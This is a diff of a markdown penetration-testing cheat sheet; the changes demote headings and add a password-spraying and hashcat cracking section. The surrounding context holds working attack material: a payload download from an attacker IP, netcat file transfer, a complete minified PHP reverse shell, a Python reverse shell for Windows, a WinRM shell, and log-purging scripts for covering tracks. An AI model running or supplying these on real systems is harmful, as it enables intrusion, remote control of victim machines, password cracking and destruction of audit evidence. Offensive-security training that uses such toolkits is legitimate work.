@@ -6,7 +6,7 @@ description: 'They don''t have to be elegant, they just have to get the job done
 
 ## FILE TRANSFERS
 
-#### Python HTTP File Download
+### Python HTTP File Download
 
 If you have remote command execution on a box with python - something like this should do the trick:
 
@@ -16,7 +16,7 @@ or if it is a Windows box, it's not much different:
 
 `C:\Python2.7\python.exe -c "import urllib; f = urllib.URLopener(); f.retrieve('http://<attacker ip>/rs_powershell.exe', '/temp/rs_powershell.exe');"`
 
-#### VBS HTTP File Download
+### VBS HTTP File Download
 
 I got stuck with a borked up reverse shell on a Windows system with no file transfer methods and no modern scripting options. I scraped together the following one-liner to dump into my shell to get my payload over by writing a VBS script with echo statements to issue the download:
 
@@ -24,7 +24,7 @@ I got stuck with a borked up reverse shell on a Windows system with no file tran
 
 _\(originally sourced from here:_ [_http://karceh.blogspot.com/2011/06/vbs-download-file-from-internet.html_](http://karceh.blogspot.com/2011/06/vbs-download-file-from-internet.html)_\)_
 
-#### Netcat File Transfer
+### Netcat File Transfer
 
 Because if Netcat is on the system, everything becomes easier:
 
@@ -37,13 +37,13 @@ sender#> nc -w 3 [destination] 4444 < input.file
 
 ## REVERSE SHELLS / SHELLS
 
-#### PHP Reverse Shell - Minified
+### PHP Reverse Shell - Minified
 
 `<?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.10.10"; $port = 8080; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { exit(1); } $daemon = 1; } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); while (1) { if (feof($sock)) { break; } if (feof($pipes[1])) { break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { $input = fread($sock, $chunk_size); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { $input = fread($pipes[1], $chunk_size); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $chunk_size); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); ?>`
 
 _\(originally sourced from:_ [_https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php_](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)_\)_
 
-#### Python Reverse Shell for Windows
+### Python Reverse Shell for Windows
 
 ```python
 import os,socket,subprocess,threading;
@@ -77,7 +77,7 @@ except KeyboardInterrupt:
     s.close()
 ```
 
-#### WinRM Ruby Shell
+### WinRM Ruby Shell
 
 ```text
 require 'winrm'
@@ -109,13 +109,13 @@ _\(originally sourced from:_ [_https://github.com/WinRb/WinRM_](https://github.c
 
 ## ENUMERATION
 
-#### Download Mailbox Attachments \(Exchange\)
+### Download Mailbox Attachments \(Exchange\)
 
 ```text
 Coming Soon!
 ```
 
-#### Finding Vulnerable Applications \(Linux\)
+### Finding Vulnerable Applications \(Linux\)
 
 This one is pretty dirty, and pretty awesome. Run a one-liner on your victim to generate a list of packages \(`rpm` **or** `dpkg`\) on the machine \(`/tmp/packages.txt`\). Copy this file to one that has `searchsploit`, and run the script.
 
@@ -127,7 +127,7 @@ Run the following script: [https://github.com/burmat/burmatscripts/blob/master/b
 
 _\(thanks to_ [_chryzsh_](https://github.com/chryzsh) _for doing the heavy lifting\)_
 
-#### "Proc Mon" \(IppSec\) Script 
+### "Proc Mon" \(IppSec\) Script 
 
 One of the handiest scripts to find running jobs and processes in real time. Thanks to [IppSec](https://twitter.com/ippsec) for sharing it with the world:
 
@@ -145,7 +145,7 @@ while true; do
 done
 ```
 
-#### SNMP Walker
+### SNMP Walker
 
 I don't remember where I got this, but incredibly useful to focus in on key info from an `snmpwalk` prior to sifting through all of it:
 
@@ -182,7 +182,7 @@ for ip in $(cat ~/Documents/labs/targets.txt  | awk '/^[0-9]/ {print $1}'); do
 done
 ```
 
-#### Ping Scan \(fast\)
+### Ping Scan \(fast\)
 
 ```python
 #!/usr/bin/python
@@ -227,9 +227,24 @@ if __name__ == '__main__':
         print(ip)
 ```
 
+## CRACKING {#cracking}
+
+### Password Spray List {#password-spray-list}
+
+Use `exrex` \[[https://github.com/asciimoo/exrex](https://github.com/asciimoo/exrex)\] to generate a custom wordlists to password spray with:
+
+```text
+python exrex.py "(Spring|Winter|Autumn|Fall|Summer|Winter)(20)1[78]!"
+```
+
+### Small Wordlist, Rules {#small-wordlist-rules}
+
+I got hit with having to crack mscachev2 hashes which can be slow. This is a perfect time to instead try targeted \(small\) wordlists and instead pass in some tried-and-tested rules: `hashcat64.exe -a 0 -m 2100 -r rules/d3adhob0.rule mscachev2hash.txt wordlist.txt -o cracked.txt`  
+
+
 ## SYSTEM CLEANUP
 
-#### Purge Linux Logs
+### Purge Linux Logs
 
 ```bash
 #!/bin/sh
@@ -252,7 +267,7 @@ for ii in /var/log/proftpd/* /var/log/postgresql/* /var/log/apache2/*; do
 done
 ```
 
-#### Covering Your Tracks
+### Covering Your Tracks
 
 ```bash
 #!/bin/bash
